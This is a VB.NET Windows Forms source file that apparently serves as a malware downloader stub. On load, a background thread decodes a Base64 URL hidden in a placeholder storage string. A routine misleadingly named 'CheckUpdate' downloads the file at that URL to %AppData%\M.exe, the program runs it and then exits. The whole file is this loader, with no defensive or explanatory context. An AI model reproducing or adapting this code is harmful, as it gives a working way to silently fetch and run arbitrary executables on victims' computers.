Public Class Form1
    Dim Storage As String = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Ti As New System.Threading.Thread(AddressOf lul)
        Ti.Start()
        Do Until Ti.IsAlive = True

        Loop
        Do Until Ti.IsAlive = False

        Loop
    End Sub

    Sub lul()
        Dim x() As String = Split(Storage, "!~!")
        CheckUpdate(Base64DecodeString(x(1)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\M.exe")
        If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\M.exe") Then
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\M.exe")
        End If
        End
    End Sub

    Function Base64DecodeString(ByVal InputText As String)
        Dim decodedBytes As Byte()
        decodedBytes = Convert.FromBase64String(InputText)
        Dim decodedText As String = System.Text.Encoding.UTF8.GetString(decodedBytes)
        Return decodedText
    End Function


    Sub CheckUpdate(ByVal UpdateURL As String, ByVal Path As String)

        Dim request As Net.HttpWebRequest = DirectCast(Net.WebRequest.Create(UpdateURL), Net.HttpWebRequest)

        request.AllowAutoRedirect = True

        request = DirectCast(Net.WebRequest.Create(UpdateURL), Net.HttpWebRequest)
        request.Timeout = 10000
        'request.AllowWriteStreamBuffering = True

        Dim response As Net.HttpWebResponse = Nothing
        response = DirectCast(request.GetResponse(), Net.HttpWebResponse)
        Dim s As IO.Stream = response.GetResponseStream()

        'Write to disk
        Dim fs As New IO.FileStream(Path, IO.FileMode.Create)

        Dim read As Byte() = New Byte(255) {}
        Dim count As Integer = s.Read(read, 0, read.Length)
        While count > 0
            fs.Write(read, 0, count)
            count = s.Read(read, 0, read.Length)
        End While

        'Close everything
        fs.Close()
        s.Close()
        response.Close()
    End Sub
End Class


